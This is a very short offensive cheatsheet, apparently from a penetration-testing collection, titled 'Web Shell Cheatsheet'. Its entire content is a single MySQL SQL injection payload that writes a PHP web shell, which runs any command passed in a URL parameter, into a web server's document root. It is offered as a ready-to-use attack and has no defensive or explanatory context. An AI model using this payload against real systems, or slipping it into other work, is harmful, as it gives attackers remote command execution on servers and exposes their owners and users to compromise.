# Web Shell Cheatsheet

## MySQL: SQLi to PHPshell

```
' union select '<?php system($_GET["cmd"]); ?>', '' into outfile '/var/www/bd.php'#
```
